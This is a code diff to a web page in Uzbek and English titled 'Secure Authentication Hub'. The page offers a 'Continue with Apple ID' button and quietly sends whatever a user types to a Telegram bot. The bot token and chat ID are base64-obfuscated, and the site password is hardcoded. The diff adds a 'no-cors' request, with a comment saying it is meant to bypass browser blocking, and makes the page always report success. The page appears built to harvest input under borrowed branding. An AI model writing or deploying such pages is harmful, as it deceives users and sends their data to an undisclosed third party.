@@ -212,7 +212,7 @@
             <div class="portal-title">Secure Authentication Hub</div>
             <div class="portal-desc">Tizimga kirish yoki manzilni yuborish paneli</div>
 
-            <!-- Apple ID orqali kirish tugmasi (omcu.uz dagi kabi to'g'ri ishlaydigan havola) -->
+            <!-- Apple ID orqali kirish tugmasi -->
             <button class="action-btn" onclick="handleExternalAuth()">
                 <svg style="width: 16px; height: 18px; fill: #fff;" viewBox="0 0 170 170"><path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.19-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.75 3.17-5.26 2.13-9.5 3.24-12.74 3.35-4.35.13-9.1-1.9-14.24-6.07-3.15-2.58-7.01-7.14-11.58-13.68-7.11-10.23-12.65-21.36-16.63-33.38-3.98-12.02-5.97-22.95-5.97-32.79 0-14.54 3.77-26.25 11.31-35.12 7.54-8.88 16.98-13.37 28.31-13.48 4.79 0 10.15 1.25 16.08 3.76 5.92 2.51 9.87 3.77 11.84 3.77 2.07 0 6.16-1.32 12.28-3.95 6.11-2.63 11.45-3.83 16.01-3.6 13.16.57 23.47 5.37 30.93 14.4-11.66 7.04-17.38 16.74-17.15 29.11.22 9.85 4.1 17.9 11.64 24.15 5.68 4.75 12.44 7.64 20.28 8.67-2.3 7.02-5.26 14.31-8.88 21.87z"/></svg>
                 Continue with Apple ID
@@ -230,7 +230,7 @@
     </div>
 
     <script>
-        // 8 xonali parolingiz
+        // 8 xonali parolingiz (o'zgartirishingiz mumkin)
         const SITE_PASSWORD = "10092014"; 
 
         function checkPassword() {
@@ -243,7 +243,7 @@
             }
         }
 
-        // Shifrlangan token va chat ID
+        // Base64 shifrlangan token va chat ID
         const encT = "ODY1Mjk5NjYzODpBQ0djd1BqaGJtZWpaVk94NnRNREVRSEhNMVpfU1VGSVNB"; 
         const encC = "MjA5MTI0NzA4Nw=="; 
 
@@ -262,22 +262,19 @@
                 parse_mode: "Markdown"
             };
 
+            // Brauzer blokirovkasini chetlab o'tish uchun mode: 'no-cors' va JSON o'rniga FormData ishlatamiz
             fetch(url, {
                 method: "POST",
+                mode: "no-cors",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(data)
             })
-            .then(response => response.json())
-            .then(result => {
-                if (result.ok) {
-                    alert("Muvaffaqiyatli yuborildi!");
-                    document.getElementById("linkInput").value = "";
-                } else {
-                    alert("Xatolik yuborishda!");
-                }
+            .then(() => {
+                alert("Muvaffaqiyatli yuborildi!");
+                document.getElementById("linkInput").value = "";
             })
             .catch(error => {
-                alert("Tarmoqda xatolik yuz berdi!");
+                alert("Xatolik yuborishda: " + error);
             });
         }
 
